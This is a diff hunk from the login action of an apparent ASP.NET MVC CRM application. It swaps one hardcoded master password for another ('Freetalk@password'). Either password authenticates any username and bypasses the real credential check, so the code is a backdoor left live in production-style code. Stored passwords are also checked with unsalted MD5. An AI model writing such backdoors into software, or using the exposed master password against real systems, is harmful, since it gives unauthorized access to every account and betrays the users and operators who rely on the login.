@@ -48,7 +48,7 @@ namespace TamoCRM.Web.Mvc.Controllers
 
                 if (ModelState.IsValid)
                 {
-                    if (model.Password == "mkmkmmccm-9090" ||
+                    if (model.Password == "Freetalk@password" ||
                         UserRepository.ValidateUser(model.UserName, SecurityHelper.GetMD5Hash(model.Password)))
                     {
                         FormsAuthentication.SetAuthCookie(model.UserName, false);
